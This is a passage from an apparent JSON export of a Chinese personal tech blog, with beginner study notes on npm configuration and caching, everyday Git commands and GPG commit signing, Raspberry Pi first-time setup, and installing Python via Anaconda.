NPM 镜像 npm config set registry https://registry.npm.taobao.org -g\n使用方法 cnpm install 包名\npackage.json文件是用来定义包的属性 name 是包名 version 是包的版本号 description 是包的描述 homepage 是包的官网的url author 是包的作者名称 contributors 是包的其他贡献者名称 dependencies 是依赖包的列表，有依赖的名称和依赖的版本号，npm会自动将依赖安装到node_module目录下 repository 包代码存放的地方的类型，git或者svn main 指定了程序的主入口文件 keywords 关键字\n启动项目\nnpm run dev\nnpm run serve\n用npm安装的包都在package.json中声明了，在另一个环境下，直接npm install，就可以一键安装该项目的全部包，不用一个个安装了\nnpm install执行流程，找到npmrc文件，得到包从哪里下，下到哪里的数据，然后再判断是否存在package-lock.json文件，存在则和package.json判断版本声明是否一致（从缓存，网络资源加载依赖），一致则按照package-lock.json处理，不一致则按照package.json处理，并且更新package-lock.json\n如果没有package-lock.json文件则检查是否存在缓存，如果有缓存则解压到node_modules中，并且生成package-lock.json文件，如果没有缓存则从npm远程仓库获取包，检查包的完整性，然后添加到缓存，构建依赖树，并且解压到node_modules中，然后再生成package-lock.json文件\nnpmrc文件优先级：项目的npmrc文件\u0026gt;用户npmrc文件\u0026gt;全局npmrc文件\u0026gt;npm内置的npmrc文件\nnpm安装会先根据npmrc文件选择npm远程仓库\n项目npmrc文件在当前项目的目录\n用户npmrc文件可通过执行npm config get userconfig查看目录\n全局npmrc文件（公共npmrc）可通过npm config get prefix查看目录\n例如在项目根目录下创建.npmrc文件，并且设置registry=https://registry.npm.taobao.org\nnpmrc文件的配置是通过键值对的形式的，registry为key，https://registry.npm.taobao.org为value\n设置用户npmrc文件\n可以直接修改用户npmrc文件或者执行npm config set registry https://registry.npm.taobao.org\n设置全局npmrc文件\n可以直接修改全局npmrc文件或者执行config set registry https://registry.npm.taobao.org -g\n快速修改用户npmrc文件，npm config edit\n快速修改全局npmrc文件，npm config edit -g\n删除registry（npmrc的其他配置也可以修改，npm config delete key）\nnpm config delete registry\n查看npmrc详细配置\nnpm config list [-l]\n查看npmrc具体参数配置（npmrc的其他配置也可以查看，npm get registry key）\nnpm get registry registry\n查看全局环境包目录，npm root -g\nnpm优先安装依赖到当前项目目录的node_modules目录中，也就是说同一依赖可能在计算机上多次安装，当然也可以使用参数-g全局安装\nnpm缓存\n查看npm缓存目录，npm config get cache\n清除缓存，npm cache clean \u0026ndash;force\n下载包时会先下载到缓存中，使用pacote包解压到node_modules目录中\n其中pacote包又依赖于npm-registry-fetch来下载包，并且根据IETF RFC 7234生成缓存\n在下载包时，根据package-lock.json存储的integrity，version，name信息生成唯一的key\n如果存在缓存资源，则寻找其tar包的hash，通过pacote包将其解压到node_modules目录中\nnpm init可生成一个初始化的package.json，可通过js脚本来自定义npm init\nnpm-init.js\nmodule.exports = {\rname: prompt('name?''halloword'),\rversion: prompt('version?''0.0.1')\r}\rnpm config set init-module ~.npm-init.js\nnpm link（方便本地开发包，以及调试测试，假设npmModulea目录是一个包项目目录）\n先进入包项目目录（npmModulea目录），执行npm link，执行该命令会让npmModulea包被链接到全局node_modules目录中（软链接）\n在包项目目录（npmModulea目录）执行npm link npmModulea，该命令可以让npmModulea包链接到当前项目的node_modules目录中\nnpx可以直接执行node_modules目录的.bin目录下的文件，还可以在执行命令时自动检查命令是否存在\n而且npx在执行模块时，会优先安装模块的依赖，在执行之后会删除这些依赖，避免全局安装模块带了的问题\n部署私有npm镜像，nexus（java环境），verdaccio（Python环境），cnpm（node环境）\ncnpm私有npm镜像仓库：https://github.com/cnpm/cnpmjs.org\n简化依赖树，npm dedupe，避免几个包依赖另一个同版本包时，存在多个依赖的情况（yarn会自动执行该命令，自动扁平化依赖树）\nnpm ci要求项目存在package-lock.json或者npm-shrinkwrap.json，而且npm ci比npm install安装更严格，其完全根据package-lock.json安装依赖（安装依赖时不会修改package-lock.json和package.json），当package-lock.json中的依赖于package.json不一致时，报错退出并且不会修改package-lock.json\n注意：package-lock.json和npm-shrinkwrap.json同时存在项目目录时，package-lock.json会被忽略\nnpm ci安装依赖前，会先删除原来项目的node_modules文件夹，然后全新安装，而且是一次安装项目的全部依赖，不能安装单个依赖，所以其不需要去校验已下载依赖版本与控制版本的关系，也不用校验是否存在最新版本的库，下载的速度会更快\npackage-lock.json可以优化依赖的安装速度，package-lock.json已经保存了每个包的具体版本和下载链接，不需要再向远程仓库进行查询，获取到依赖后可直接进入文件完整性校验环节（integrity）\n而且package-lock.json可以锁定其依赖结构，保证执行npm install都得到相同的node_modules\npackage-lock.json保存其生成的依赖树是一致的，而package.json只能得到自己安装的依赖，但是其依赖的子依赖并没有记录，子依赖可能会发生改变或者更新了版本，从而导致其依赖树不一致\npackage-lock.json中的xxxdependencies\ndependencies表示项目依赖（会自动下载），devDependencies表示开发依赖（不会自动下载），peerDependencies表示同版本依赖（父依赖，宿主依赖），bundledDependencies表示捆绑依赖，optionalDependencies表示可选依赖\n注意：peerDependencies指定的依赖会进行安装，在引用这个依赖时，会先引用宿主依赖，bundledDependencies中指定的依赖，需要先在dependencies和devDependencies声明过，否则会报错，optionalDependencies中指定的依赖哪怕安装失败了，也不会导致安装失败\npeerDependencies其中的依赖就是好吧antd依赖于react和react-dom一样，是宿主依赖，表示你安装我时，最好安装这些依赖\n","permalink":"https://99999.fun/posts/31/","summary":"npm是Node.js的默认包管理工具\n安装npm：安装node.js(一般来说安装nodejs都会安装npm的)\nnpm -v 查看npm版本号 node -v 查看node版本号 npm install nmp@latest -g 更新最新nmp，-g全局，没有加-g就是本地安装，或者在@后面加版本号来更新到指定版本的npm npm init -y 初始化 npm i 要安装的依赖 先检查有没有这个东西，有的话就下载下来 npm uninstall 要删除的依赖的名称 npm i 要安装的依赖@版本号 安装指定版本的依赖 npm update 依赖名称 安装最新的依赖或者更新npm npm init -y 使用默认的参数，去掉-y就是手动配置 npm run 对象名 执行脚本,引用package.json中的scripts对象，在对象中添加脚本 npm adduser 注册npm账号 npm publish 发布npm包 npm install 一键安装package.json文件里的所有依赖 npm install \u0026ndash;dependencies 只安装package.json里的dependencies的文件 npm install \u0026ndash;devDependencies 只安装package.json里的devDependencies文件 会自动将package.json中的模块安装到node-modules文件夹\n升级插件 npm-check-updates使用 npm install -g npm-check-updates 安装npm-check-updates插件 ncu 查看package.json中依赖的最新版本 ncu -u 更新依赖到最新版本 ncu -a 更新全部依赖到最新版本 npm update","title":"node.js包管理工具npm的简单使用"},{"content":"git安装\nWindows和mac\n到git官网下载对应的安装文件，进行安装，下一步\nLinux\nsudo apt install git-all 或者 sudo dnf install git-all\n也可以用源代码编译（Git是开源的，是Linux之父的作品） https://github.com/git/git/releases\n方便git管理，记录每一个修改了Git仓库的人，设置用户名和邮箱\ngit config \u0026ndash;global user.name \u0026ldquo;chenjunlin\u0026rdquo; git config \u0026ndash;global user.email \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;\nssh-keygen -t rsa -C \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo; # 生成ssh密钥\nmkdir learngit #创建一个空目录\ncd learngit # cd到目录\npwd #显示当前目录路径\ngit init #将当前的目录变成git管理仓库\nls -ah #将所有目录（包括隐藏目录）显示出来\ngit add 文件名 #将文件添加到仓库中\ngit commit -m 说明 #告诉git这次添加到仓库的说明，可以是任意内容\ngit status #返回仓库的当前状态\ngit diff 文件名 #查看当前文件的内容\ngit log #查看历史记录，加上\u0026ndash;pretty=oneline 查看commit id（版本号）\ngit reset \u0026ndash;hard HEAD^ #回退上一个版本，上上一个版本就是HEAD^^，以此类推，或者使用HEAD~ 就是要回退多少个版本\ngit reset \u0026ndash;hard commit id #回到“未来”的版本，版本号可以不用写全，git会自动搜索，过版本号长度要尽量的长，防止可能出现搜索到多个版本的情况\ngit reflog #查看命令历史，也被用于找回commit id\ngit reflog show和git log -g \u0026ndash;abbrev-commit \u0026ndash;pretty=oneline效果是一样的\ngit add 实际上是把要提交文件存在暂存区，git commi 是一次性把暂存区的文件提交到分支，每一次git commi都要小心！！！\ngit checkout \u0026ndash; 文件名 #把该文件从工作区的修改全部撤销掉（修改后还没有git add放在暂存区或者已经提交到暂存区后又修改了使用这个就回到提交到暂存区后的状态）\ngit reset HEAD 文件名 #将暂存区的修改撤销掉，重新放回工作区\ngit rm 文件名 #把该文件从版本库中删除\nssh-keygen -t rsa -C \u0026ldquo;邮箱\u0026rdquo; #创建SSH Key,在用户主目录，查看.ssh目录，再查看该目录 有没有id_rsa和id_rsa.pub文件，没有就执行该命令，id_rsa是私钥，id_rsa.pub是公钥，在github的Key文本框添加上id_rsa.pub文字的内容\ngit remote add origin git@github.com: github的账户名/仓库名.git #关联github仓库\ngit push -u 远程仓库名 本地分支名 # 把本地分支推送到远程库上 -u是第一次添加要使用，本地的分支和远程的分支关联起来，关联了后，第2次推送就不用加了\ngit remote add 远程库名 远程库的git链接#本地和远程库关联起来\ngit clone git@git库地址 #克隆远程库到本地\ngit checkout -b 分支名 #创建dev分支并切换到该分支，也可以使用下面方法\ngit branch 分支名 #创建分支\ngit checkout 分支名 #切换到该分支\ngit branch #查看当前分支，会输出全部分支，在当前分支前加*\ngit checkout 分支名 #切换回指定分支\ngit merge 分支名 #可以把指定分支合并到当前分支\ngit branch -d 分支名 #删除该分支\ngit status #查看冲突的文件\n\u0026laquo;\u0026laquo;\u0026laquo;\u0026lt;和=======和\u0026raquo;\u0026raquo;\u0026raquo;\u0026gt;表示不同分支的内容，修改冲突就是把不同分支提交的内容修改为一样的\n一般都是先克隆主分支上的最新文件，然后在最新文件上进行操作，然后提交，避免分支冲突\ngit log #查看分支的合并图，可以在后面加上\u0026ndash;graph\n合并分支时，git可能会使用fast forward模式，在这种模式下删除分支会丢掉分支信息，在合并时候使用git merge \u0026ndash;no-ff 分支名 表示禁用fast forward，可以加上-m参数，把commit说明加上，使用fast forward模式是看不出来做出过合并的\ngit stash #把还没有提交的工作现场存起来，可以重新恢复工作现场\ngit stash list #查看已经存起来的工作现场\ngit stash apply #恢复工作现场，但是不会删除stash的内容，需要使用git stash drop来删除\ngit stash pop #恢复工作现场并删除stash的内容\ngit stash apply stash@{指定} #可以指定恢复的stash\ngit branch -D 分支名#强制删除分支，在没有被合并的情况时\ngit remote #查看关联的远程库信息，或者加-v 查看更详细的信息，没有推送权限就没有push地址\ngit push 远程库名 分支名 #把该分支推送到远程库对应的分支上\ngit checkout -b 分支名 远程库名/分支名 #默认只有主分支，要使用其他分支上工作就使用这个\ngit branch \u0026ndash;set-upstream-to=远程库名/分支名 分支名 #指定本地分支与远程分支的链接\ngit pull #把最新的提交抓下来\ngit rebase #把本地未push的分叉提交历史衍合成基线，使用该命令会导致本地的分叉提交被修改\ngit tag 标签名 #给对应的分支打上标签，git tag查看所有标签\ngit tag -a 标签名 -m \u0026ldquo;说明\u0026rdquo; 版本号\ngit tag 标签名 版本号 #标签链接版本号\ngit show 标签名 #查看标签信息\ngit tag -d 标签名 #删除指定的标签\ngit push 远程库名 标签名 #推送该标签到远程库上，或者\u0026ndash;tags 一次性推送全部没有推送到远程库的本地标签\n删除远程库的标签先删除本地标签，然后使用 git push 远程库名：refs/tags/标签名\ngit remote rm 远程库名 #删除已有的远程库\ngit stash # 暂存修改，将改变暂时存起来\ngit stash list #查看在 stash 中的缓存 然后恢复工作现场\n合并冲突\n合并冲突是因为不同的分支，修改了同一份文件，而git不知道以谁为准，因此提示合并冲突，只需要修改这个冲突文件，修改为某个分支的修改，执行git status查看冲突的文件，再合并就好了\ngit status #查看冲突的文件\ngit log #查看分支的合并图\ngit log \u0026ndash;graph \u0026ndash;pretty=oneline \u0026ndash;abbrev-commit #简化信息\n修改冲突的文件的内容，改成一样的\ngit merge \u0026ndash;abort # 退出合并，当合并冲突发生时，但是有不想修改冲突，而是想取消合并时，指向该命令，git会尝试恢复到执行合并前的状态\n版本冲突\n版本冲突就是当前版本不是最新的，git不知道以哪个版本为准，因此提示版本冲突，只需要git pull获取最新版本，就可以避免这个问题，如果已经发生版本冲突了，那么执行git status查看冲突文件，不管是分支冲突还是版本冲突，其修改都不会丢失，而是保存在这个冲突文件中，只需要手动修改成自己想要的就好了，一般来说上面是本地的，下面是最新的\n版本控制\n获取git仓库\n将本地目录转换为git仓库（初始化仓库）\n克隆已存在的git仓库到本地\ngit的三种状态\n已修改，已暂存，已提交\ngit正常的工作流程：\n工作区修改文件 -\u0026gt; 要提交的文件暂存 -\u0026gt; 提交更新（永久性存储到git仓库）\n工作区 -\u0026gt; 暂存区 -\u0026gt; git仓库\n初始化仓库\ngit init // 初始化当前目录为git仓库，初始化会创建.git的隐藏目录，.git目录包含初始的必要文件\n工作区中的文件的4种状态\n未追踪（untracked）：没有被git管理的文件，git之前的提交中没有该文件\n未修改（unmodified）：工作区内容和git仓库中文件的内容保持一致\n已修改（modified）：工作区内容和git仓库中文件的内容不一致\n已暂存（staged）：工作区已被修改文件被放到暂存区，准备提交到git仓库中\n检查文件的状态\ngit status\n以精简的方式显示文件状态\n未跟踪文件前面会有??标记\n已跟踪文件前面会有A标记\ngit status -s\ngit status \u0026ndash;short\n跟踪新文件或者将已跟踪，已修改的文件存放在暂存区，将有冲突的文件标记为已解决冲突\ngit add 文件名或者目录名\n暂存多个文件\ngit add .\n提交更新（将暂存区提交到git仓库）\ngit commit -m 本次提交的描述\n撤销对文件的修改（恢复到git仓库中的版本）\ngit checkout \u0026ndash; 要撤销的文件名\n取消已暂存的文件（移除在暂存区的指定文件）\ngit reset HEAD 要移除的文件名\n跳过暂存区\n工作区 -\u0026gt; git仓库\n会将全部已经被跟踪的文件暂存起来一并提交\ngit commit -a -m 本次提交的描述\n移除文件\ngit仓库和工作区移除文件\ngit rm -r 要移除的文件名\ngit仓库移除文件，工作区保留\ngit rm \u0026ndash;cached 要移除的文件名\n忽略文件\n将一些文件不纳入git管理\n.gitignore配置文件\n以*开头的表示忽略，例如：*.java，表示忽略所有.java文件\n以#开头是注释\n以/结尾的是目录，忽略任何目录下的指定的文件夹，例如：hallo/\n以/开头的是防止递归，只忽略当前目录的指定文件，例如：/hallo.java\n以!开头的是表示取反，哪怕忽略了java，就是匹配所有指定的文件，例如：!hallo.java\n使用glob模式进行匹配（glob是简化的正则表达式）\nglob模式\n*匹配0个或者多个\n[abc]匹配任何一个在括号里的字符\n?只匹配一个任意字符\n[0-9]：匹配所有0到9的数字\na/**/c：可以匹配任意中间目录，例如a/b/c\n例如：\nhallo/*.java // 忽略hallo目录下的全部java文件\nhallo/**/*.java // 忽略hallo目录以及全部子目录下的全部java文件\n查看提交历史\n按时间来排序全部提交历史，最近的提交在上面\ngit log\n只查看最新的指定条数的提交历史\ngit log 6\n在一行上查看指定条数的提交历史\ngit log 6 \u0026ndash;pretty=oneline\n在一行上查看指定条数的提交历史，并且按照输出格式来输出\ngit log \u0026ndash;pretty=oneline: \u0026ldquo;%h | %an | %ar | %s\u0026rdquo;\n%h为提交的简写哈希值\n%an为作者名字\n%ar为作者修订日期\n%s为提交说明\n回退指定版本\ngit reset \u0026ndash;hard 版本id\n旧版本返回新版本（获取新版本的id）\ngit reflog \u0026ndash;pretty=oneline\ngithub\n远程仓库访问：https和ssh\nhttps：必须要输入账号和密码\nssh：需要配置，配置成功，不需要输入账号和密码\n将本地仓库上传到远程仓库\n本地有仓库：\n本地仓库和远程仓库进行关联 git remote add origin 远程仓库地址\n推送本地仓库内容 git push -u origin master\n如果本地没有仓库，先建立仓库，再关联，推送\ngit init -\u0026gt; git add -\u0026gt; git commit\n如果已经关联过，推送过，可以直接git push推送\nssh key\n生成ssh key\nssh-keygen -t rsa -b 4096 -C \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;\n如果是windows，会在C:\\Users\\用户名文件夹.ssh下\nid_rsa：私钥\nid_rsa.pub：公钥\n私钥可以通过计算推出公钥，公钥推不出私钥，因此密钥安全性很高，通过配置公钥到github中，本地的私钥可以确保，是本人在提交推送\n检测是否配置ssh key成功\nssh -T git@github.com\nhttps远程仓库\nhttps://github.com/xxx/xxx.git\nssh远程仓库\ngit@github.com:xxx/xxx.git\n简单来说就是公钥设置在github\ngit clone 远程库\n再修改文件\ngit add . // 提交文件到暂存区\ngit commit -m \u0026ldquo;xxx\u0026rdquo; // 提交更新\ngit push -u -f origin master // 推送到远程仓库，-f是强制推送（团队仓库别使用-f，个人无所谓）\n注意：git对文件名大小写默认不敏感，因此修改hallo.py和Hallo.py是不认为被修改，在提交时没有记录，如果想开启大小写敏感可以找到项目的.git文件夹（隐藏文件，需显示）,找到config文件，修改ignorecase为false，或者直接用git config core.ignorecase false命令一键修改\ngit回滚\ngit reset HEAD^ // 回到add暂存区时（未commit）\ngit reset \u0026ndash;hard HEAD^ // 回滚到上个版本，HEAD是当前版本的指向\ngit reset \u0026ndash;hard commitId // 回到指定版本，commitId使用git log查看（commit那一行的id）\n注意：reset回退会删除之前版本的（例如原版本在第3次修改，回到第2版本，会将第3版本的修改删除（这个删除不是指实质删除，而是工作区的代码回到之前的版本了，在第2版本上，没第3版本了））\n如果这是某个修改有错误，要回退时，但是又想保留之前版本的工作时就可以使用git revert -n commitId\n这种需求常见于多人协同开发，当别人已经push提交，如果再使用reset回退的话，就会影响到别人的提交，因为版本冲突了，revert实质上就是恢复到某个版本，但是之前的版本不会被删除，而且是在当前最新版本的基础上创建了一个新的版本，当然在git上没有是绝对的删除，只要有commitId在就可以恢复\n在git2.23版本中添加了git switch命令，该命令专门用来切换分支，功能和git checkout一致\ngit switch 分支名 // 切换到指定分支\ngit switch -c 分支名 // 创建该分支并且切换到该分支，和git checkout -b功能一致\n解决分支无法合并\n导致原因：不同的分支都有自己的新提交，git不知道以谁的为准\n解决方法：手动解决，通过git status命令查看冲突的文件\ngit commit \u0026ndash;amend // 对最近提交的message进行修改\ngit rebase -i commit的id // 修改指定提交的message，这里应该使用reword或者r，退出该文件后，git会弹出修改commit描述的文件\ngit rebase -i中有6种命令，分别是pick，reword，edit，squash，fixup，exec\npick：提交，可通过排序来变更提交的顺序，如果不想要该次直接删除整行\nreword：和pick类似，但是它可以给你修改commit的message的机会\nedit：提供机会来修改提交\nsquash：将多个或者两个提交合并成一个提交，压缩到其上方的提交，并且给机会来编写这次提交的message\nfixup：和squash类似，不过合并的过程中，被合并的提交的message将丢失，压缩到其上方的提交，但是只保留较早的提交的message\nexec：对提交执行shell命令\n解决分支冲突的其他解决方案（本地分支与远程仓库分支合并，本地分支作为指定远程仓库分支的未来分支提交）\n将远程分支拉取至本地 git fetch 远程仓库地址 分支名\n查看远程分支 git branch -r\n查看全部分支 git branch -a\n将远程仓库分支与本地当前分支合并 git merge 远程仓库地址/分支名\n将远程仓库分支的修改与本地当前分支合并（rebase可以将其他分支的提交作为当前分支的时间线的开头，也就是当前分支作为新的未来提交分支了） git rebase 远程仓库地址/分支名\nGPG签名（通过签名来确定提交者身份，git默认的用户及邮箱可以伪造，不安全）\n查看git是否包含GPG命令（windows要在Git Bash 运行）\ngpg \u0026ndash;version\n创建GPG keys\ngpg \u0026ndash;full-generate-key\n第一个是选择加密算法，选择1就好，然后就是选择key的长度（选择4096），再然后就是选择密令的有效期（根据自己选择来，不想过期就选择0），然后名称，邮箱，最后选择o设置私钥密码就创建完成\n查看生成的公钥\ngpg \u0026ndash;list-keys\n查看私钥\ngpg \u0026ndash;list-secret-keys\n关联GPG公钥到Github\ngpg \u0026ndash;armor \u0026ndash;export 密钥ID\n对commit签名\ngit config \u0026ndash;global user.signingkey 密钥ID\n开启git自动签名（也可以在git commit的时候使用-s参数）\ngit config \u0026ndash;global commit.gpgsign true\n查看git仓库签名信息\ngit log \u0026ndash;show-signature\n解决github网页签名问题\n导入github签名\ncurl https://github.com/web-flow.gpg | gpg \u0026ndash;import\n信任签名并且用自己的密钥进行签名验证\ngpg \u0026ndash;sign-key github的key\n","permalink":"https://99999.fun/posts/30/","summary":"git安装\nWindows和mac\n到git官网下载对应的安装文件，进行安装，下一步\nLinux\nsudo apt install git-all 或者 sudo dnf install git-all\n也可以用源代码编译（Git是开源的，是Linux之父的作品） https://github.com/git/git/releases\n方便git管理，记录每一个修改了Git仓库的人，设置用户名和邮箱\ngit config \u0026ndash;global user.name \u0026ldquo;chenjunlin\u0026rdquo; git config \u0026ndash;global user.email \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo;\nssh-keygen -t rsa -C \u0026ldquo;a@xiaochenabc123.test.com\u0026rdquo; # 生成ssh密钥\nmkdir learngit #创建一个空目录\ncd learngit # cd到目录\npwd #显示当前目录路径\ngit init #将当前的目录变成git管理仓库\nls -ah #将所有目录（包括隐藏目录）显示出来\ngit add 文件名 #将文件添加到仓库中\ngit commit -m 说明 #告诉git这次添加到仓库的说明，可以是任意内容\ngit status #返回仓库的当前状态\ngit diff 文件名 #查看当前文件的内容\ngit log #查看历史记录，加上\u0026ndash;pretty=oneline 查看commit id（版本号）\ngit reset \u0026ndash;hard HEAD^ #回退上一个版本，上上一个版本就是HEAD^^，以此类推，或者使用HEAD~ 就是要回退多少个版本","title":"Git版本管理系统学习笔记"},{"content":"（树莓派系统）Raspbian是基于Debian GNU/Linux的免费操作系统，所以可以使用debian的操作方法来配置系统和使用系统\n现改名为Raspberry Pi OS\n工具：读卡器，16g内存卡，micro usb充电器，树莓派，一台pc\n修改为国内镜像源\n# 编辑 /etc/apt/sources.list 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberry-pi-os/raspbian/ buster main non-free contrib rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspberry-pi-os/raspbian/ buster main non-free contrib rpi\n# 编辑 /etc/apt/sources.list.d/raspi.list 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui\n使用刻录工具刻录树莓派系统（Win32DiskImager）\n使用读卡器读取系统信息，在boot目录新建一个名为ssh的空白文件，用来打开ssh服务，ssh文件不需要存在内容 没有用那么需要手动启动ssh服务：service sshd restart\n在boot目录新建一个wpa_supplicant.conf文件\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1\nnetwork={\rssid=\u0026quot;wifi的名字\u0026quot;\rpsk=\u0026quot;wifi的密码\u0026quot;\rkey_mgmt=WPA-PSK\rpriority=1\r}\rupdate_config=1，这个用来控制wifi的优先级，只有一个wifi的时候可有可无，没有影响\n插入内存卡，连接电源，开启树莓派\nWindows10开热点会显示连接设备的ip，wifi路由器的就去路由器后台找\n使用ssh工具，连接树莓派，默认用户名：pi，密码：raspberry 修改用户密码：sudo passwd pi pi是要修改密码的用户\n修改用户名： vi /etc/shadow 把用户名修改为新用户名，其他不要动 vi /etc/group 把用户名修改为新用户名，其他不要动！！！ 修改完，保存，重启\nvnc服务\nsudo raspi-config\n依次操作：Interfacing Options -\u0026gt; VNC -\u0026gt; Yes\n选择第5个的interfacing Options\n找到第3个的vnc\n系统会提示是否安装vnc服务，回复y或者yes，等待系统安装完成\n或者安装vnc apt-get install x11vnc\nx11vnc -storepasswd 设置vnc密码，vnc登录使用\nx11vnc -usepw 用密码形式来启动vnc\nx11vnc -usepw -forever 防止vnc闪退，一直连接vnc\n开启桌面\nsudo raspi-config\n找到Boot Options，选择Desktop，重启\nssh-keygen 为了防止ssh连接每次都要输入密码，而设置的key密匙\nssh-copy-id pi@192.168.137.230 推送到要ssh的linux机子\n","permalink":"https://99999.fun/posts/29/","summary":"（树莓派系统）Raspbian是基于Debian GNU/Linux的免费操作系统，所以可以使用debian的操作方法来配置系统和使用系统\n现改名为Raspberry Pi OS\n工具：读卡器，16g内存卡，micro usb充电器，树莓派，一台pc\n修改为国内镜像源\n# 编辑 /etc/apt/sources.list 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberry-pi-os/raspbian/ buster main non-free contrib rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspberry-pi-os/raspbian/ buster main non-free contrib rpi\n# 编辑 /etc/apt/sources.list.d/raspi.list 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui\n使用刻录工具刻录树莓派系统（Win32DiskImager）\n使用读卡器读取系统信息，在boot目录新建一个名为ssh的空白文件，用来打开ssh服务，ssh文件不需要存在内容 没有用那么需要手动启动ssh服务：service sshd restart\n在boot目录新建一个wpa_supplicant.conf文件\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1\nnetwork={\rssid=\u0026quot;wifi的名字\u0026quot;\rpsk=\u0026quot;wifi的密码\u0026quot;\rkey_mgmt=WPA-PSK\rpriority=1\r}\rupdate_config=1，这个用来控制wifi的优先级，只有一个wifi的时候可有可无，没有影响\n插入内存卡，连接电源，开启树莓派\nWindows10开热点会显示连接设备的ip，wifi路由器的就去路由器后台找\n使用ssh工具，连接树莓派，默认用户名：pi，密码：raspberry 修改用户密码：sudo passwd pi pi是要修改密码的用户\n修改用户名： vi /etc/shadow 把用户名修改为新用户名，其他不要动 vi /etc/group 把用户名修改为新用户名，其他不要动！！！ 修改完，保存，重启\nvnc服务\nsudo raspi-config\n依次操作：Interfacing Options -\u0026gt; VNC -\u0026gt; Yes","title":"配置树莓派笔记"},{"content":"安装python\n推荐安装anaconda3（linux）\nwget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2021.05-Linux-x86_64.sh\ndash Anaconda3-2019.10-Linux-x86_64.sh\n根据提示安装，如果还是系统自带的python\nsudo gedit ~/.bashrc\nexport PATH=\u0026quot;/home/pc/anaconda3/bin:$PATH\u0026quot;\npc为系统的用户名，请修改成自己的系统用户名，请勿在root用户下安装anaconda3\n注意：如果使用anaconda3，请设置Path环境变量，/Anaconda3，/Anaconda3/Scripts，/Anaconda3brary/bin，这3个路径都需要设置\nWindows和mac 到官网下载安装包，直接下一步安装\nmac安装了Homebrew，可以使用brew install python3\nWindows设置环境变量，PATH 安装路径\n现在liunx一般都会自带有python3,如果没有可以安装一下\napt install python3\nyun install python3\n注意一下python2.x和python3.x这两个版本是不兼容的，要区分开\n检查是否安装成功，在命令行或者终端输入python3 回车 没有反应或者报错就说明没有安装成功或者可能出问题了 Windows的一定要注意PATH系统变量\n因为Python语言从规范到解释器都是开源的，所以存在多个解释器\n例如CPython，安装python3.x时就可以直接获取到一个官方版本的解释器：CPython，因为是使用C语言开发的，所以叫CPython\n在命令行或者终端，输入输入python3 回车，如果出现了\u0026raquo;\u0026gt; 那么当前状态是python的交互模式\n在交互模式下输入exit()，退出python的交互模式\n在交互模式下执行第一个程序 print(\u0026ldquo;hello,world\u0026rdquo;)\n回车输出hello，world，这是简单的打印字符串\n除了使用交互模式执行程序，又可以使用.py，在命令行或者终端下 python hello.py，如果报错，请检查程序是否出错或者该文件是否在当前目录下\n交互模式可以直接输出结果，但是使用.py文件却不会，想要输出结果，必须使用print()打印出来\n一个好的开发工具往往可以达到事半功倍的效果，例如pycharm和Visual Studio Code，我使用的是Visual Studio Code\nprint()接受多个输出，使用“,”分隔开，也可以输出整数\n当你想让用户输入一点东西的时候，python提供了一个input()，用法如下 name = input() 将输入的值存放到一个变量里\ninput()还提供了提示功能，显示一个字符串，例如：input(\u0026ldquo;xxxxx\u0026rdquo;)\n我想知道这个变量的内容咋办，可以在交互模式下直接输入变量名，回车，就可以查看该变量的内容 又可以使用print()打印下来\n那么什么是变量呢？\n在计算机程序中，变量不仅可以为整数或浮点数，还可以是字符串\n输入是Input，输出是Output，输入输出统称为Input/Output，或者简写为IO\n以#开头的语句是注释，注释是给人看的，解释器会忽略掉注释，注释可以是任何内容\n其他每一行都是一个语句，当语句以冒号:结尾时，缩进的语句视为代码块\n注意：python区分大小写，搞错了大小写，程序可能会报错。缩进建议使用4个空格\npython能直接处理的有：整型，浮点型，字符串，布尔值，空值，变量，常量\npython可以处理整型任意大小的整数，也可以使用二进制代表整数、\n浮点型就是小数，使用科学记数法表示时，一个浮点数的小数点位置是可变的，所以小数又叫浮点型，表示很大或很小的浮点数，必须用科学计数法表示\n字符串是使用\u0026quot;\u0026ldquo;和\u0026rsquo;\u0026lsquo;括起来的任意文本，\u0026lsquo;\u0026lsquo;或\u0026quot;\u0026ldquo;本身只是一种表示方式，不是字符串的一部分\n字符串内部包含\u0026rsquo;又包含\u0026quot;怎么办？使用转义字符来标识，转义字符可以转义很多字符，比如n表示换行，t表示制表符，字符本身也是可以转义的，所以\\表示的字符就是\\\n为了简化，Python还允许用r\u0026rsquo;\u0026rsquo;，用来表示\u0026rsquo;\u0026lsquo;内部的字符串默认不转义\n在交互式命令行内输入，在输入多行内容时，提示符由\u0026raquo;\u0026gt;变为\u0026hellip;，提示可以接着上一行输入，注意\u0026hellip;是提示符，不是代码的一部分\n多行字符串\u0026rsquo;\u0026lsquo;\u0026lsquo;xxx\u0026rsquo;\u0026rsquo;\u0026rsquo;，可以在前面加上r使用\n布尔值只有两种值，分别是True和False，在计算机中布尔值要么是True，要么是False，在python中可以直接使用True、False表示布尔值，注意大小写\nand是与运算，只有所有值都为True时，and运算结果才是True\nor运算是或运算，只要其中有一个为True，那么or运算结果就是True\nnot运算是非运算，它是一个单目运算符，专门把True变成False，False变成True\n空值，使用None表示空值，这个空值不是0，因为0是有意义的，代表什么都没有\n在计算机程序中，变量不仅可以是数字，还可以是任意数据类型。\n变量在程序中用一个变量名表示，变量名必须是大小写英文、数字和_的组合，且不能用数字开头，\n变量名 = 任意数据类型，这个过程叫变量赋值，变量可以反复赋值\n这种变量本身类型不固定的语言称之为动态语言，与之对应的是静态语言。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。\n例如golang就是一个静态语言，不能跨数据类型来赋值\nx = 1\nx = x+1\n这个是计算新的值，并且重新赋值给该变量\na = 